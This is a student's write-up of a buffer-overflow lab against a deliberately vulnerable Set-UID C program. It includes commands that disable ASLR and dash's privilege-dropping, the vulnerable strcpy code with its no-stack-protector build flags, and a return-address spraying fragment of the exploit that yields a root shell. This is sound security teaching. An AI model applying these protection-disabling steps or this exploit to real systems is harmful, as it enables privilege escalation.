# Buffer Overflow Attack Lab (Set-UID Version)

## Environment Setup

Modern operating systems have implemented several security mechanisms to make the buffer-overflow attack difficult. 

Ubuntu and several other Linux-based systems uses address space randomization to randomize the starting address of heap and stack.  This makes guessing the exact addresses difficult; guessing addresses is one of the critical steps of buffer-overflow attacks.

This protection, can be disabled with the command:

```bash
 $ sudo sysctl -w kernel.randomize_va_space=0
 ```

In the recent versions of Ubuntu OS, the/bin/sh symbolic link points to the/bin/dash shell. The dash program, as well as bash, has implemented a security countermeasure that prevents itself from being executed in a Set-UID process. Basically, if they detect that they are executed in a Set-UID process, they will immediately change the effective user ID to the process’s real user ID, essentially dropping the privilege.

Since  our  victim  program  is a Set-UID program, we will link /bin/sh to another shell that does not have such a countermeasur using the following command:

```bash
 $ sudo ln -sf /bin/zsh /bin/sh
 ```

# Task 1

After, we compiled "call_shell.c" using "make", two executables where created one for 32 bits and another for 64 bits. When running them, both opened a new shell in the same directory that we ran the program.

![CreateShell](../docs/week5/log5task1.png)

# Task 2

In the "stack.c" file we have the following code:

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* Changing this size will change the layout of the stack.
 * Instructors can change this value each year, so students
 * won't be able to use the solutions from the past.
 */
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif

void dummy_function(char *str);

int bof(char *str)
{
    char buffer[BUF_SIZE];

    // The following statement has a buffer overflow problem 
    strcpy(buffer, str);       

    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;

    badfile = fopen("badfile", "r"); 
    if (!badfile) {
       perror("Opening badfile"); exit(1);
    }

    int length = fread(str, sizeof(char), 517, badfile);
    printf("Input size: %d\n", length);
    dummy_function(str);
    fprintf(stdout, "==== Returned Properly ====\n");
    return 1;
}

// This function is used to insert a stack frame of size 
// 1000 (approximately) between main's and bof's stack frames. 
// The function itself does not do anything. 
void dummy_function(char *str)
{
    char dummy_buffer[1000];
    memset(dummy_buffer, 0, 1000);
    bof(str);
}
```

This program has a buffer-overflow vulnerability. It starts by opening a file "badfile" and reading 517 bytes to an array of chars called str. Then, it calls the bof function and uses "strcpy" to copy data from the array to a buffer of chars with size of 100 bytes. This process causes an overflow because "strcpy" does not check boundaries.

For the vulnerable program, we disabled StackGuard and protections against code execution invoked from the stack. Additionally, we changed the program's owner to root and activated Set-UID.

This can be done with the following commands:

````bash
 $ gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c
 $ sudo chown root stack
 $ sudo chmod 4755 stack
 ````

Because the compilation and setup commands are already included in Makefile, we just need to type "make".

![CreateShell](../docs/week5/log5task2.png)




# Task 4

At the start of this task, we use gdb to find the buffer adress, ignoring the buffer size "160".

![bufferadress](../docs/week5/logtask4(1).png)

We only know that it is between 100 and 200 so we populate our ret variable with the values we got and define some bounds. Then we run this cycle to populate the 'content' array with the bytes from the 'ret' variable. 

```
ret    = 0xffffcac0 + start      # Change this number 
lowerbound = 100
upperbound = 200                        # Change this number 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
temp = (ret).to_bytes(L,byteorder='little')

for offset in range(lowerbound, upperbound + L, L):
    content[offset:offset + L] = temp 
```

Finally, by running the exploit we ge access to the shell.

![sucess](../docs/week5/logtask4(2).png)